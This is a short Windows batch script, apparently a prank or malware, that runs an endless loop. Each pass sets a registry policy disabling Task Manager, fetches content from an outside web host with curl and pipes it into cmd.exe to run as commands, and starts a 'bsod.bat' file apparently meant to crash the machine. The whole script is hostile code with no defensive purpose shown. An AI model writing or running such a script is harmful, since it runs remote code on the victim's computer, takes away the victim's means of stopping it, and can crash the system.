:loop
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
start curl.exe -sN http://rick.jachan.dev/ | cmd.exe
ping localhost -n 3 >nul
start bsod.bat
ping localhost -n 5 >nul
goto loop